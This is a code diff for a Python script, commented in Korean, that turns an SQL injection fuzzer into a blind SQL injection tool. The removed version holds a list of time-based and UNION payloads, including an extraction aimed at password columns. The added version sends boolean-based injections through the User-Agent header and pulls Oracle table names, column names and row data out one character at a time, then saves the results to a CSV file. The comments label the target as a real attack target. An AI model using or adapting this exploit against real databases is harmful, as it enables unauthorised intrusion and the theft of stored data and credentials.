@@ -1,150 +1,170 @@
-import os
 import socket
+import time
+import csv
 from datetime import datetime
-import re
-from gevent.pool import Pool
 
-# 필요한 디렉토리와 파일 생성 함수
-def setup_required_files():
-    headers_dir = "fuzz-data/headers"
-    payloads_dir = "fuzz-data/payloads"
+class BlindSQLInjector:
+    def __init__(self, target_params):
+        self.server = target_params['server']
+        self.port = target_params['port']
+        self.delay = target_params['delay']
+        self.threshold = target_params['threshold']
+        self.retries = target_params['retries']
+        self.success_payloads = []
+        self.failure_payloads = []
 
-    os.makedirs(headers_dir, exist_ok=True)
-    os.makedirs(payloads_dir, exist_ok=True)
+    def baseline(self):
+        """서버의 기본 응답 시간을 측정하여 기준으로 사용"""
+        total_time = 0
+        trials = 5
+        for _ in range(trials):
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(3)
+                    s.connect((self.server, self.port))
+                    start = time.time()
+                    request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\n\r\n".encode()
+                    s.sendall(request)
+                    s.recv(100)
+                    total_time += (time.time() - start)
+            except Exception as e:
+                print("기본 응답 시간 측정 실패:", e)
+                continue
+        baseline_time = total_time / trials
+        print(f"기본 응답 시간: {baseline_time:.2f}초")
+        return baseline_time
 
-    with open(os.path.join(headers_dir, "default_headers.txt"), "w") as f:
-        f.write("User-Agent\nReferer\nX-Forwarded-For\n")
-
-    with open(os.path.join(payloads_dir, "oracle_time.txt"), "w") as f:
-        f.write("' OR 1=1--\n' OR 'a'='a\n' UNION SELECT NULL, NULL--\n' OR SLEEP(5)--\n")
-        f.write("' OR WAITFOR DELAY '0:0:5'--\n' OR pg_sleep(5); --\n' OR dbms_lock.sleep(5); --\n")
-
-# 파일 생성 함수 호출
-setup_required_files()
-
-class SqlEngine:
-    def __init__(self, target, target_param, sqli_template):
-        self.server = target['server']
-        self.port = target['port']
-        self.vuln_header = target.get('vulnHeader', '')
-        self.header_value = target.get('headerValue', '')
-        self.sleep_time = target_param.get('sleepTime', 2)
-        self.sql_injection_template = sqli_template
-        self.verbose = target_param.get('verbosity', 'low').lower()
-
-        sanitized_server = re.sub(r'[^A-Za-z0-9_.-]', '_', self.server)
-        self.logfile = f"logs/{sanitized_server}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
-        self.result = False
-        self.successful_payload = ""
-
-    def log(self, message, func_name="알 수 없는 함수"):
-        """오류 로그를 파일에 기록하고, 필요시 터미널에 출력"""
-        if self.verbose == "high":
-            print(f"[!] {func_name}에서 오류 발생: {message}")
-        os.makedirs("logs", exist_ok=True)
-        with open(self.logfile, 'a') as log:
-            log.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')},{func_name},{message}\n")
-
-    def send_payload(self, sql, method="POST", url_path="/login"):
-        """SQL 인젝션 페이로드 전송 함수"""
+    def boolean_based_blind_injection(self, true_query, false_query):
+        """Boolean 기반 블라인드 SQL 인젝션"""
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((self.server, self.port))
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(5)
+                s.connect((self.server, self.port))
 
-            post_data = f"username={sql}&password=dummy_password"
-            headers = (
-                f"{method} {url_path} HTTP/1.1\r\n"
-                f"Host: {self.server}\r\n"
-                f"Content-Type: application/x-www-form-urlencoded\r\n"
-                f"Content-Length: {len(post_data)}\r\n"
-                f"Connection: close\r\n\r\n"
-            )
-            request = headers + post_data
-            s.send(request.encode())
-            response = s.recv(4096).decode()
-            s.close()
+                true_request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\nUser-Agent: {true_query}\r\n\r\n"
+                s.sendall(true_request.encode())
+                true_response = s.recv(100)
 
-            sql_data = self.extract_sql_data(response)
-            self.log(f"SQL 응답 데이터: {sql_data}", "send_payload")
-            return sql_data
+                false_request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\nUser-Agent: {false_query}\r\n\r\n"
+                s.sendall(false_request.encode())
+                false_response = s.recv(100)
+
+                print(f"응답 비교 - 참 응답: {true_response}, 거짓 응답: {false_response}")
+                return true_response != false_response
         except Exception as e:
-            self.log(str(e), "send_payload")
-            return None
+            print("Boolean 기반 인젝션 실패:", e)
+            return False
 
-    def extract_column_data(self):
-        """테이블 지정 없이 컬럼 이름 기준으로 데이터 추출"""
-        print("[*] 컬럼 기준으로 데이터 추출을 시작합니다.")
-        columns = ["ID", "name", "password", "board"]
-        for column in columns:
-            extraction_sql = f"' UNION SELECT {column} FROM information_schema.tables--"
-            response = self.send_payload(extraction_sql)
-            if response:
-                print(f"[*] '{column}' 컬럼의 데이터: {response}")
-                self.log(f"{column}: {response}", "data_extraction")
+    def extract_tables(self):
+        """데이터베이스의 테이블 이름 추출"""
+        tables = []
+        print("데이터베이스에서 테이블 추출을 시작합니다...")
+        for i in range(1, 21):
+            table_name = ""
+            for j in range(1, 21):
+                found = False
+                for ascii_code in range(32, 127):
+                    true_query = f"' AND ASCII(SUBSTR((SELECT table_name FROM user_tables WHERE ROWNUM={i}), {j}, 1)) = {ascii_code}--"
+                    false_query = true_query.replace(f"= {ascii_code}", f"!= {ascii_code}")
 
-class DBMSSQLInjectionOracle:
-    def __init__(self, target, target_param, sqli_template):
-        self.sql_engine = SqlEngine(target, target_param, sqli_template)
+                    if self.boolean_based_blind_injection(true_query, false_query):
+                        table_name += chr(ascii_code)
+                        print(f"테이블 이름 {i} - {j}번째 문자 추출 성공: '{chr(ascii_code)}'")
+                        found = True
+                        break
+                
+                if not found:
+                    if table_name:
+                        tables.append(table_name)
+                    break
+        print("테이블 추출 완료.")
+        return tables
 
-    def run(self, headers_file, injection_file):
+    def extract_columns(self, table_name):
+        """특정 테이블 내의 컬럼명 추출"""
+        columns = []
+        print(f"테이블 '{table_name}'에서 컬럼을 추출합니다...")
+        for i in range(1, 21):
+            column_name = ""
+            for j in range(1, 21):
+                found = False
+                for ascii_code in range(32, 127):
+                    true_query = f"' AND ASCII(SUBSTR((SELECT column_name FROM user_tab_columns WHERE table_name='{table_name}' AND ROWNUM={i}), {j}, 1)) = {ascii_code}--"
+                    false_query = true_query.replace(f"= {ascii_code}", f"!= {ascii_code}")
+                    
+                    if self.boolean_based_blind_injection(true_query, false_query):
+                        column_name += chr(ascii_code)
+                        print(f"컬럼 '{table_name}'의 {i}번째 - {j}번째 문자 추출 성공: '{chr(ascii_code)}'")
+                        found = True
+                        break
+
+                if not found:
+                    if column_name:
+                        columns.append(column_name)
+                    break
+        print(f"컬럼 추출 완료: {columns}")
+        return columns
+
+    def extract_data(self, table_name, column_name):
+        """테이블 내의 특정 컬럼 데이터를 하나씩 추출"""
+        extracted_data = ""
+        print(f"테이블 '{table_name}'의 컬럼 '{column_name}'에서 데이터 추출을 시작합니다...")
+        for i in range(1, 21):
+            char_found = False
+            for ascii_code in range(32, 127):
+                true_query = f"' AND ASCII(SUBSTR((SELECT {column_name} FROM {table_name} WHERE ROWNUM=1), {i}, 1)) = {ascii_code}--"
+                false_query = true_query.replace(f"= {ascii_code}", f"!= {ascii_code}")
+                
+                if self.boolean_based_blind_injection(true_query, false_query):
+                    extracted_data += chr(ascii_code)
+                    print(f"'{column_name}'에서 {i}번째 문자 추출 성공: '{chr(ascii_code)}'")
+                    char_found = True
+                    break
+            
+            if not char_found:
+                print(f"{column_name}에서 데이터 추출 완료.")
+                break
+        return extracted_data
+
+    def run(self):
+        """Blind SQL Injection 공격 시작 및 데이터 추출"""
+        self.baseline()
+        tables = self.extract_tables()
+        results = []
+        
+        for table in tables:
+            columns = self.extract_columns(table)
+            for column in columns:
+                extracted_result = self.extract_data(table, column)
+                if extracted_result:
+                    results.append({"table": table, "column": column, "data": extracted_result})
+        
+        self.save_results(results)
+
+    def save_results(self, results):
+        """결과를 CSV 파일로 저장"""
+        filename = f"blind_sql_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
         try:
-            print("[*] Oracle SQL 인젝션을 시작합니다...")
-            blind_seeker = BlindSeeker(self.sql_engine)
-            blind_seeker.fuzz(headers_file, injection_file)
-            if self.sql_engine.result:
-                print("[*] SQL 인젝션 성공. 컬럼 데이터 추출을 시작합니다...")
-                self.sql_engine.extract_column_data()
-            else:
-                print("[*] SQL 인젝션이 실패했습니다. 다른 페이로드를 시도하세요.")
+            with open(filename, mode='w', newline='', encoding='utf-8-sig') as file:
+                writer = csv.writer(file)
+                writer.writerow(["테이블명", "컬럼명", "추출 데이터"])
+                for result in results:
+                    writer.writerow([result["table"], result["column"], result["data"]])
+            print(f"데이터가 {filename} 파일에 저장되었습니다.")
         except Exception as e:
-            print(f"[!] SQL 인젝션 중 오류 발생: {e}")
+            print("결과 저장 중 오류 발생:", e)
 
-class BlindSeeker:
-    def __init__(self, sql_engine):
-        self.sql_engine = sql_engine
-        self.pool = Pool(10)
-
-    def fuzz(self, headers_file, injections_file):
-        print(f"[*] {self.sql_engine.server}:{self.sql_engine.port}에서 퍼징을 시작합니다.")
-        with open(headers_file) as headers, open(injections_file) as injections:
-            for header in headers:
-                header = header.strip()
-                for injection in injections:
-                    injection = injection.strip()
-                    self.pool.spawn(self.test_payload, injection)
-                    self.sql_engine.vuln_header = header
-                    self.sql_engine.header_value = injection
-        self.pool.join()
-        self.log_results()
-
-    def test_payload(self, sql):
-        """페이로드가 유효한지 확인하고 결과 설정"""
-        if self.sql_engine.send_payload(sql):
-            self.sql_engine.result = True
-
-    def log_results(self):
-        if self.sql_engine.result:
-            print("[*] SQL 인젝션 취약점이 발견되었습니다.")
-        else:
-            print("[*] 취약점이 발견되지 않았습니다. 페이로드를 조정하고 다시 시도하세요.")
-
-# 대상 서버 설정
-target = {
+# 실제 공격 대상 파라미터
+target_params = {
     'server': 'localhost',
     'port': 8080,
-    'vulnHeader': 'X-Forwarded-For',
-    'headerValue': 'fuzzer'
+    'delay': 1,
+    'threshold': 0.5,
+    'retries': 5
 }
 
-target_param = {
-    'sleepTime': 5,
-    'verbosity': 'high'
-}
-
-sqli_template = "' or if((*sql*),dbms_pipe.receive_message('a',*time*),0) and '1'='1"
-header_file = "fuzz-data/headers/default_headers.txt"
-injection_file = "fuzz-data/payloads/oracle_time.txt"
-
-# DBMSSQLInjectionOracle 객체 생성 및 실행
-dbms_injector = DBMSSQLInjectionOracle(target, target_param, sqli_template)
-dbms_injector.run(header_file, injection_file)
+if __name__ == "__main__":
+    injector = BlindSQLInjector(target_params)
+    print("DBMS에서 블라인드 SQL 인젝션 공격을 시작합니다...")
+    injector.run()
+    print("블라인드 SQL 인젝션 공격이 완료되었습니다.")
